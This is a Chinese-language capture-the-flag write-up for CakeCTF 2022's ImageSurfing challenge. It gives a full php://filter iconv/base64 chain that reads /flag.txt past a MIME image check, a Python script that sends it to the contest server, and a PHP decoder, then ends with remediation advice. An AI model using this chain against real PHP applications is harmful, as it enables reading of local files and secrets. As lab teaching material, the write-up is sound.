# CakeCTF 2022 ImageSurfing Writeup

## 题目简述

页面接收参数 `url`，用 `file_get_contents` 读取目标，再通过 `mime_content_type` 检查内容是否为 JPEG、PNG 或 GIF。若检查通过，文件会以内嵌 data URI 的形式返回。

因为 PHP 的 `file_get_contents` 支持流包装器，攻击者可以使用 `php://filter` 读取本地 `/flag.txt`。直接读取会因 MIME 不是图片而失败，所以还需要在过滤链中把结果转换成以 `GIF89a` 开头的可还原数据。

## 解题过程

利用链需要同时满足两个目标：

1. 输出前六字节是 GIF 文件签名 `GIF89a`，通过 `mime_content_type`；
2. flag 仍以可逆编码保存在签名后面。

官方 solver 使用多组 `iconv` 和 Base64 filter，在处理 `/flag.txt` 时构造所需前缀。完整 URL 如下：

```python
url = 'php://filter/convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UTF16|convert.iconv.L6.UTF-16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|/resource=/flag.txt'
```

请求后，HTML 中的图片字段类似：

```html
src="data:image/gif;base64,<outer-base64>"
```

先解码页面的外层 Base64，得到服务判定为 GIF 的数据。去掉 `GIF89a` 后再做一次 Base64 解码，并提取可打印的 UTF-7 文本：

```python
import base64
import re
import requests

base = 'http://web1.2022.cakectf.com:8001/'
response = requests.get(base, params={'url': url})
response.raise_for_status()

match = re.search(r'gif;base64,([^\x22]+)', response.text)
if match is None:
    raise RuntimeError('响应中没有通过 MIME 检查的 GIF')

image = base64.b64decode(match.group(1))
assert image.startswith(b'GIF89a')

stage = base64.b64decode(image[len(b'GIF89a'):] + b'==')
utf7_text = bytes(c for c in stage if 0x20 <= c <= 0x7e).decode()
print(utf7_text)
```

最后把 `utf7_text` 按 UTF-7 解码。官方环境使用 PHP 自身的 filter 反向转换，以保持与服务端 `iconv` 行为一致：

```php
<?php
$data = $argv[1];
echo file_get_contents(
    'php://filter/convert.iconv.UTF7.UTF8/resource=data:,' . urlencode($data)
);
```

将上一段脚本输出作为参数传入，即可恢复：

```text
CakeCTF{PHP_f1lt3r_!s_cH40t1c\(^o^)/}
```

## 方法总结

服务只验证“转换后的内容看起来像图片”，却允许攻击者控制读取协议和转换链。`php://filter` 既完成本地文件读取，又把纯文本包装成通过 MIME 魔数检查的 GIF，内容检查因此没有形成安全边界。

修复时不应让用户控制 `file_get_contents` 的任意 URI。应限制为明确的 `http`/`https`，拒绝 PHP wrapper，校验解析后的目标和重定向，并在隔离的下载组件中处理远程资源。仅依赖 MIME 嗅探无法防止包装器和 polyglot 数据。
